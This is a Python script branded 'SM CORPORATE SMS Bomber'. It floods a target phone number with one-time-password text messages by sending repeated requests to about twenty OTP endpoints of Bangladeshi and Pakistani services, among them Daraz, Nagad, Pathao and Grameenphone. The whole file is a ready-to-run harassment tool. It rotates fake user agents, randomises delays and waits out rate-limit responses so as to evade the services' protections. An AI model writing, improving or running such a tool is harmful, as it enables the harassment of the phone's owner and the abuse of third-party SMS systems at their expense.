import requests
import json
import time
import random
import sys
import os
from datetime import datetime

# List of APIs
APIs = [
    {"name": "Ostad OTP", "url": "https://ostad.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Sheba.xyz OTP", "url": "https://sheba.xyz/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Bikroy OTP", "url": "https://bikroy.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Nagad OTP", "url": "https://www.nagad.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Pathao OTP", "url": "https://pathao.com/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Foodpanda OTP", "url": "https://www.foodpanda.com.bd/api/v2/otp/send", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Pickaboo OTP", "url": "https://www.pickaboo.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "ShopUp OTP", "url": "https://www.shopup.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Meena Bazar OTP", "url": "https://meenabazar.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "PriyoShop OTP", "url": "https://www.priyoshop.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Evaly OTP", "url": "https://evaly.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "AjkerDeal OTP", "url": "https://ajkerdeal.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Daraz Pakistan OTP", "url": "https://daraz.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Viber OTP", "url": "https://viber.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "EasyPaisa OTP", "url": "https://www.easypaisa.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Telenor OTP", "url": "https://www.telenor.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Jazz OTP", "url": "https://www.jazz.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Grameenphone OTP", "url": "https://grameenphone.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Robi OTP", "url": "https://robi.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
]

# Random User-Agents to mimic different devices
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def format_phone_number(api_name, phone):
    if api_name in ["Daraz OTP", "Daraz Pakistan OTP", "Viber OTP"]:
        return "+" + phone  # International format
    elif api_name in ["Grameenphone OTP", "Robi OTP"]:
        return phone if phone.startswith("01") else "0" + phone  # Local format
    return phone

def send_request(api, phone):
    formatted_phone = format_phone_number(api["name"], phone)
    url = api["url"]
    method = api["method"]
    data = json.loads(json.dumps(api["data"]).replace("{number}", formatted_phone))
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.example.com",
        "Referer": "https://www.example.com/",
    }

    try:
        if method == "POST":
            response = requests.post(url, json=data, headers=headers, timeout=10)
        else:
            response = requests.get(url, params=data, headers=headers, timeout=10)

        status = "Success" if response.status_code < 400 else f"Failed (Status: {response.status_code})"
        return {"success": response.status_code < 400, "status": status}
    except requests.RequestException as e:
        return {"success": False, "status": f"Error: {str(e)}"}

def select_apis():
    clear_screen()
    print("=== SM CORPORATE 🍁 SMS Bomber ===")
    print("Select APIs to use (enter numbers separated by commas, or 'all' for all):")
    for i, api in enumerate(APIs):
        print(f"{i+1}. {api['name']}")
    choice = input("\nYour choice (e.g., 1,2,3 or all): ").strip().lower()

    if choice == "all":
        return APIs
    try:
        indices = [int(x) - 1 for x in choice.split(",")]
        return [APIs[i] for i in indices if 0 <= i < len(APIs)]
    except (ValueError, IndexError):
        print("Invalid selection. Using all APIs.")
        time.sleep(2)
        return APIs

def main():
    clear_screen()
    print("=== SM CORPORATE 🍁 SMS Bomber ===")
    phone = input("Enter phone number (e.g., 01712345678): ").strip()
    if not phone.isdigit() or len(phone) < 10:
        print("Invalid phone number. Exiting...")
        time.sleep(2)
        return

    try:
        count = int(input("Enter number of messages (1-100): ").strip())
        if not 1 <= count <= 100:
            raise ValueError
    except ValueError:
        print("Invalid message count. Exiting...")
        time.sleep(2)
        return

    selected_apis = select_apis()
    if not selected_apis:
        print("No APIs selected. Exiting...")
        time.sleep(2)
        return

    print(f"\nStarting SMS bombing to {phone} with {count} messages...")
    total_requests = len(selected_apis) * count
    current_request = 0

    for i in range(count):
        random.shuffle(selected_apis)  # Randomize API order
        for api in selected_apis:
            result = send_request(api, phone)
            current_request += 1
            progress = (current_request / total_requests) * 100
            status = f"[{current_request}/{total_requests}] {api['name']}: {result['status']}"
            print(f"{status} | Progress: {progress:.1f}%")

            if not result["success"] and "429" in result["status"]:
                print("Rate limit detected. Pausing for 10 seconds...")
                time.sleep(10)
            else:
                time.sleep(random.uniform(2, 5))  # Random delay 2–5 seconds

        if i < count - 1:
            time.sleep(random.uniform(5, 10))  # Delay between rounds

    print("\nSMS bombing completed!")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped by user.")
        sys.exit(0)
